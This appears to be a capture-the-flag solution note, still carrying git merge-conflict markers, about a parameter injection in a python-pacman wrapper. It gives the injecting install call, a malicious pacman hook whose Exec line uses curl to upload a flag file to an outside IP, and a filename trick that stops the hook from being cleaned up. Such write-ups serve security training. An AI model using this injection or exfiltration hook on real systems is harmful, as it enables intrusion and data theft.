<<<<<<< HEAD
# spoiler: this is the solution



=======
>>>>>>> 215417f9139707be31157057f1fa34e2c87c08e0
0day in python-pacman (allows parameter injection)

- exploit code is: pacman.install(["--hookdir", "/tmp/pacman/", "wget"])
- we can use json to put a list into the install function instead of a string (string is not vuln)
<<<<<<< HEAD
- pacman hook looks like this

```
=======
- Hook looks like this
>>>>>>> 215417f9139707be31157057f1fa34e2c87c08e0

[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning pacman cache...
When = PostTransaction
Exec = /bin/bash -c "curl --upload-file /flag.txt http://192.168.178.200:4444"
<<<<<<< HEAD
```

- we need to write a file to the directory (therefore I added /check)
=======

- we need to write a file to the directory
>>>>>>> 215417f9139707be31157057f1fa34e2c87c08e0
- we need to throw an exception in check_output so that the remove() does not get called
- therefore we use ' -h.hook' as filename (calls --help and returns 2)
- hook files must end with .hook. The hook will only be executed if something will be installed (check if it's not already installed!)


<<<<<<< HEAD

=======
>>>>>>> 215417f9139707be31157057f1fa34e2c87c08e0
